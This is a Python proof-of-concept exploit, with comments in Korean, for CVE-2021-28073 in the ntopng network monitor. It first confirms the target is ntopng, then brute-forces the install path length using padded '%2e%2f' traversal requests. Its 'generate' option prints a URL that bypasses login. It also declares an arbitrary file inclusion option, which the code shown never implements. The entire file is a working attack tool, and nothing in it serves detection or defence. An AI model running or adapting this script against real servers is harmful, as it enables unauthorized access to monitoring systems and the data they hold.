import sys
import requests
import argparse
import logging

# 대상 URL이 ntopng 서비스가 맞는지 확인하는 함수.
def is_ntopng() -> bool:
    response = session.get(base_url, allow_redirects=False)
    return response.status_code == 302 and '/lua/login.lua' in response.headers.get('Location', '')

# ntopng lua 디렉터리의 경로 길이를 구하는 함수.
# 브루트포스 방식으로 "./"를 하나씩 붙여가면서, 요청했을 때 상태 코드가 300 미만인 경우를 찾는다.
def get_base_length() -> int:
    for i in range(90, 120):
        url = base_url + '/lua/' + '%2e%2f' * i + 'as_stats.lua.css'
        response = session.get(url, allow_redirects=False)
        if response.status_code < 300:
            return 255 - 1 - i * 2 - len('as_stats.lua')

    for i in range(90, 120):
        url = base_url + '/lua/' + '%2e%2f' * i + 'get_macs_data.lua.css'
        response = session.get(url, allow_redirects=False)
        if response.status_code < 300:
            return 255 - 1 - i * 2 - len('get_macs_data.lua')

    return -1

# 패딩 길이를 구하는 함수.
# "./"으로 패딩해야 하므로, 패딩해야 하는 길이가 홀수인 경우는 지원하지 않음.
def get_padding_length(path: str):
    padding_length = 255 - 1 - base_length - len(path)
    if padding_length % 2 == 1:
        raise RuntimeError(f'path {path} is not support')

    return int(padding_length / 2)


logging.basicConfig(stream=sys.stderr, level=logging.WARNING)
session = requests.Session()
session.headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'


if __name__ == '__main__':
    # 명령줄 인자를 설정하는 부분(--url, -p, -l 옵션)
    parser = argparse.ArgumentParser(description='CVE-2021-28073 POC for ntopng.')
    parser.add_argument('-u', '--url', help='base url for ntopng, eg: http://192.168.1.233:3000', metavar='<URL>', required=True)
    parser.add_argument('-v', '--verbose', default=False, action='store_true')
    
    subparsers = parser.add_subparsers(dest='action')

    baselength_command = subparsers.add_parser('baselength', help='get base path length of ntopng')

    generate_command = subparsers.add_parser('generate', help='generate the authenticate bypass url')
    generate_command.add_argument('-l', '--length', type=int, help='base path length of target ntopng', metavar='<LENGTH>', required=True)
    generate_command.add_argument('-p', '--path', help='lua pathname', metavar='<PATH>', required=True)

    generate_command = subparsers.add_parser('include', help='generate the arbitrary file inclusion url')
    generate_command.add_argument('-l', '--length', type=int, help='base path length of target ntopng', metavar='<LENGTH>', required=True)
    generate_command.add_argument('-i', '--include', help='path to include', metavar='<PATH>', required=True)

    args = parser.parse_args()
    # 명령줄 인자가 적절히 설정되지 않은 경우 도움말을 출력하고 반환
    if not args.action:
        parser.print_help()
        sys.exit(1)

    if args.verbose:
        logging.basicConfig(stream=sys.stderr, level=logging.DEBUG)

    # base_url = http://your-ip.com
    base_url = args.url.rstrip('/')
    
    # check target
    if not is_ntopng():
        raise RuntimeError('No Ntopng detected')
    # 설정된 옵션이 baselength인 경우, ntopng lua 디렉터리의 경로 길이를 반환
    if args.action == 'baselength':
        base_length = get_base_length()
        sys.stdout.write(f'ntopng install path length: {base_length}\n')
    # 설정된 옵션이 generate인 경우, 인증 없이 인터페이스에 접근할 수 있는 URL 경로를 계산하여 반환
    elif args.action == 'generate':
        base_length = args.length
        path = args.path
        sys.stdout.write(base_url + '/lua/' + '%2e%2f' * get_padding_length(path) + path + '.css\n')
